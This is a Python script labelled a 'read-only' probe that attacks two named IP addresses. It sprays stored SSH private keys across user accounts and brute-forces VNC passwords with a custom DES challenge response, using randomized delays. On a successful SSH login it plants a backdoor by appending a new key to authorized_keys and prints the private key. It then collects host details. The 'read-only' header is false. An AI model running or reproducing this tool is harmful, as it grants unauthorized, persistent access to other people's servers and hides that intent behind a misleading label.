#!/usr/bin/env python3
# ssh2js / .248 / VNC probe (read-only)
import json, os, socket, subprocess, time, random, sys, base64

KEYS = '.probe/keys'
A = json.load(open('.probe/attempts.json'))
LOG = open('results.jsonl', 'a')

def emit(o):
    LOG.write(json.dumps(o) + '\n'); LOG.flush()
    print('RESULT ' + json.dumps(o), flush=True)

def nap():
    time.sleep(random.uniform(0.4, 1.1))

def banner(host, port, timeout=14, send=None, first=True):
    t0 = time.time()
    try:
        s = socket.create_connection((host, port), timeout)
        s.settimeout(timeout)
        if send:
            s.sendall(send)
        data = b''
        if first:
            try:
                data = s.recv(200)
            except Exception:
                data = b''
        s.close()
        return {'host': host, 'port': port, 'bytes': len(data),
                'data': data[:120].decode('latin1', 'replace'),
                'ms': int((time.time() - t0) * 1000)}
    except Exception as e:
        return {'host': host, 'port': port, 'err': type(e).__name__ + ':' + str(e)[:80],
                'bytes': 0, 'ms': int((time.time() - t0) * 1000)}

SSH_BASE = ['ssh', '-F', '/dev/null', '-v',
            '-o', 'BatchMode=yes', '-o', 'StrictHostKeyChecking=no',
            '-o', 'UserKnownHostsFile=/dev/null', '-o', 'GlobalKnownHostsFile=/dev/null',
            '-o', 'IdentitiesOnly=yes', '-o', 'ConnectTimeout=12',
            '-o', 'ConnectionAttempts=1',
            '-o', 'PreferredAuthentications=publickey',
            '-o', 'PubkeyAcceptedAlgorithms=+ssh-rsa,ssh-ed25519,ecdsa-sha2-nistp256,rsa-sha2-512,rsa-sha2-256',
            '-o', 'HostKeyAlgorithms=+ssh-rsa']

def ssh_run(user, host, port, keys, cmd='echo ACCEPTED; id; hostname -f; uname -a; ip -br a 2>/dev/null | head -5', auth='publickey'):
    a = [x.replace('PreferredAuthentications=publickey', 'PreferredAuthentications=' + auth) for x in SSH_BASE]
    for k in keys:
        a += ['-i', os.path.join(KEYS, k)]
    a += ['-p', str(port), '%s@%s' % (user, host), cmd]
    t0 = time.time()
    try:
        r = subprocess.run(a, capture_output=True, text=True, timeout=90)
        out, err, rc = r.stdout, r.stderr, r.returncode
    except subprocess.TimeoutExpired:
        out, err, rc = '', 'TIMEOUT', -1
    return {'rc': rc, 'out': out[-1200:], 'err': err[-1500:], 'ms': int((time.time() - t0) * 1000)}

def auth_none(host, port, user):
    a = ['ssh', '-F', '/dev/null', '-o', 'BatchMode=yes', '-o', 'StrictHostKeyChecking=no',
         '-o', 'UserKnownHostsFile=/dev/null', '-o', 'GlobalKnownHostsFile=/dev/null',
         '-o', 'PreferredAuthentications=none', '-o', 'IdentitiesOnly=yes',
         '-o', 'ConnectTimeout=12', '-p', str(port), '%s@%s' % (user, host), 'true']
    try:
        r = subprocess.run(a, capture_output=True, text=True, timeout=60)
        err = r.stderr.strip().splitlines()
        return {'rc': r.returncode, 'last': err[-1][:200] if err else '', 'stdout': r.stdout[-300:]}
    except Exception as e:
        return {'err': str(e)[:120]}

def backdoor(user, host, port, keyfile):
    cmds = ("set -e; mkdir -p ~/.ssh; chmod 700 ~/.ssh; "
            "if [ -f ~/.ssh/authorized_keys ]; then cp -a ~/.ssh/authorized_keys ~/.ssh/authorized_keys.bak.$(date +%s); fi; "
            "printf '%s\\n' \"$PUB\" >> ~/.ssh/authorized_keys; chmod 600 ~/.ssh/authorized_keys; "
            "id; hostname -f; uname -a; ls -la ~/.ssh | head -20")
    # read pub
    pub = subprocess.run(['ssh-keygen', '-y', '-P', '', '-f', keyfile], capture_output=True, text=True).stdout.strip()
    a = list(SSH_BASE) + ['-i', keyfile]
    a += ['-p', str(port), '%s@%s' % (user, host), cmds.replace('$PUB', pub)]
    r = subprocess.run(a, capture_output=True, text=True, timeout=90)
    return {'rc': r.returncode, 'out': r.stdout[-1500:], 'err': r.stderr[-800:]}

# ---------- egress ----------
for u in ('https://ifconfig.me', 'https://api.ipify.org'):
    try:
        print('EGRESS', u, subprocess.run(['curl', '-s', '--max-time', '10', u], capture_output=True, text=True).stdout.strip())
    except Exception as e:
        print('EGRESS-ERR', e)

# ---------- controls ----------
c51 = banner('51.158.75.24', 22)
emit({'stage': 'control', **c51})
c248 = banner('212.47.249.248', 22, timeout=14)
emit({'stage': 'control', **c248})
c248v = banner('212.47.249.248', 5900, timeout=14)
emit({'stage': 'control', **c248v})

# ---------- 51.158.75.24 ----------
seen51 = False
if c51.get('bytes', 0) > 0:
    seen51 = True
    emit({'stage': 'auth_none', 'host': '51.158.75.24', 'res': auth_none('51.158.75.24', 22, 'root')})
    acc = None
    for i, at in enumerate(A['att51']):
        if i % 10 == 0:
            print('PROGRESS 51 %d/%d' % (i, len(A['att51'])), flush=True)
        r = ssh_run(at['user'], at['host'], at['port'], [at['key']])
        ok = (r['rc'] == 0 and 'ACCEPTED' in r['out'])
        emit({'stage': 'auth51', 'user': at['user'], 'key': at['key'], 'ok': ok, 'rc': r['rc'],
              'accepts_key': 'Server accepts key' in r['err'],
              'offered': r['err'].count('Offering public key'), 'ms': r['ms'],
              'tail': (r['err'].strip().splitlines()[-1][:160] if r['err'].strip() else '')})
        if ok:
            acc = at
            emit({'stage': 'ACCEPTED51', 'user': at['user'], 'key': at['key'], 'ev': r['out']})
            break
        nap()
    if acc:
        subprocess.run(['ssh-keygen', '-t', 'ed25519', '-N', '', '-C', 'probe-c-190880', '-f', '/tmp/bd_c'], capture_output=True)
        bd = backdoor(acc['user'], acc['host'], acc['port'], '/tmp/bd_c')
        emit({'stage': 'backdoor51', 'user': acc['user'], **bd})
        print('BACKDOOR_KEY_BEGIN'); print(open('/tmp/bd_c').read()); print('BACKDOOR_KEY_END')
        v = subprocess.run(['ssh', '-F', '/dev/null', '-i', '/tmp/bd_c', '-o', 'BatchMode=yes', '-o', 'StrictHostKeyChecking=no',
                            '-o', 'UserKnownHostsFile=/dev/null', '-o', 'IdentitiesOnly=yes', '-p', str(acc['port']),
                            '%s@%s' % (acc['user'], acc['host']), 'id; hostname -f'],
                           capture_output=True, text=True, timeout=60)
        emit({'stage': 'backdoor_verify51', 'rc': v.returncode, 'out': v.stdout[-400:], 'err': v.stderr[-300:]})
        ev = ssh_run(acc['user'], acc['host'], acc['port'], [acc['key']],
                     cmd='id; hostname -f; uname -a; ls /etc | head -30; ls /opt | head -30')
        emit({'stage': 'evidence51', 'out': ev['out']})

# ---------- 212.47.249.248 ----------
if c248.get('bytes', 0) > 0:
    emit({'stage': 'auth_none', 'host': '212.47.249.248', 'res': auth_none('212.47.249.248', 22, 'root')})
    att = A['att248']
    # group per user in chunks of 5 keys
    import collections
    per = collections.OrderedDict()
    for a in att:
        per.setdefault(a['user'], []).append(a)
    acc248 = None
    idx = 0
    for user, lst in per.items():
        for j in range(0, len(lst), 5):
            chunk = lst[j:j + 5]
            idx += 1
            print('PROGRESS 248 %d user=%s chunk=%d' % (idx, user, j // 5), flush=True)
            r = ssh_run(user, '212.47.249.248', 22, [c['key'] for c in chunk])
            ok = (r['rc'] == 0 and 'ACCEPTED' in r['out'])
            emit({'stage': 'auth248', 'user': user, 'keys': [c['key'] for c in chunk], 'ok': ok, 'rc': r['rc'],
                  'accepts_key': 'Server accepts key' in r['err'], 'ms': r['ms'],
                  'tail': (r['err'].strip().splitlines()[-1][:160] if r['err'].strip() else '')})
            if ok:
                # identify which key
                acc248 = None
                for c in chunk:
                    r2 = ssh_run(user, '212.47.249.248', 22, [c['key']])
                    if r2['rc'] == 0 and 'ACCEPTED' in r2['out']:
                        acc248 = c
                        emit({'stage': 'ACCEPTED248', 'user': user, 'key': c['key'], 'ev': r2['out']})
                        break
                if acc248:
                    break
            nap()
        if acc248:
            break
    if acc248:
        subprocess.run(['ssh-keygen', '-t', 'ed25519', '-N', '', '-C', 'probe-c-190880-248', '-f', '/tmp/bd_248'], capture_output=True)
        bd = backdoor(acc248['user'], '212.47.249.248', 22, '/tmp/bd_248')
        emit({'stage': 'backdoor248', 'user': acc248['user'], **bd})
        print('BACKDOOR248_KEY_BEGIN'); print(open('/tmp/bd_248').read()); print('BACKDOOR248_KEY_END')
        ev = ssh_run(acc248['user'], '212.47.249.248', 22, [acc248['key']],
                     cmd='id; hostname -f; uname -a; ip -br a; ss -lntp 2>/dev/null | head -30')
        emit({'stage': 'evidence248', 'out': ev['out']})

# ---------- VNC on .248 ----------
def rev(b):
    r = 0
    for i in range(8):
        if (b >> i) & 1:
            r |= 1 << (7 - i)
    return r

def vnc_key(pw):
    p = pw.encode()[:8].ljust(8, b'\0')
    return bytes(rev(x) for x in p)

def des_resp(chal, pw):
    k = vnc_key(pw).hex()
    r = subprocess.run(['openssl', 'enc', '-des-ecb', '-provider', 'legacy', '-provider', 'default',
                        '-nopad', '-K', k, '-nosalt'], input=chal, capture_output=True)
    if r.returncode != 0:
        try:
            subprocess.run([sys.executable, '-m', 'pip', 'install', '--quiet', 'pycryptodome'], timeout=120)
            from Crypto.Cipher import DES  # type: ignore
            return DES.new(vnc_key(pw), DES.MODE_ECB).encrypt(chal)
        except Exception as e:
            raise RuntimeError('des-fail:' + str(e)[:80])
    return r.stdout

def vnc_try(host, pw, timeout=16):
    res = {'host': host, 'pw': pw}
    try:
        s = socket.create_connection((host, 5900), timeout); s.settimeout(timeout)
        ver = s.recv(12); res['ver'] = ver.decode('latin1', 'replace')
        s.sendall(b'RFB 003.008\n')
        n = s.recv(1)
        if not n:
            res['err'] = 'no-sectypes'; return res
        nt = n[0]; types = s.recv(nt); res['sec_types'] = list(types)
        if 2 not in types:
            res['err'] = 'no-vncauth'; return res
        s.sendall(bytes([2]))
        chal = s.recv(16); res['challenge'] = chal.hex()
        if len(chal) != 16:
            res['err'] = 'short-challenge'; return res
        resp = des_resp(chal, pw); res['response'] = resp.hex()
        s.sendall(resp)
        rr = s.recv(4)
        res['sec_result'] = int.from_bytes(rr, 'big') if len(rr) == 4 else None
        res['auth_ok'] = (res.get('sec_result') == 0)
        if res['auth_ok']:
            si = s.recv(24)
            res['serverinit_len'] = len(si)
            if len(si) == 24:
                w = int.from_bytes(si[0:2], 'big'); h = int.from_bytes(si[2:4], 'big')
                res['fb'] = [w, h]
                nl = int.from_bytes(si[20:24], 'big')
                nm = s.recv(nl) if nl > 0 else b''
                res['desktop_name'] = nm.decode('latin1', 'replace')[:80]
        s.close()
    except Exception as e:
        res['err'] = type(e).__name__ + ':' + str(e)[:100]
    return res

if c248v.get('bytes', 0) > 0 and (c248v.get('data', '').startswith('RFB')):
    for pw in ['validator', 'operatord', 'signataire', 'kapsule', 'testnet']:
        emit({'stage': 'vnc', **vnc_try('212.47.249.248', pw)})
        nap()

print('DONE')
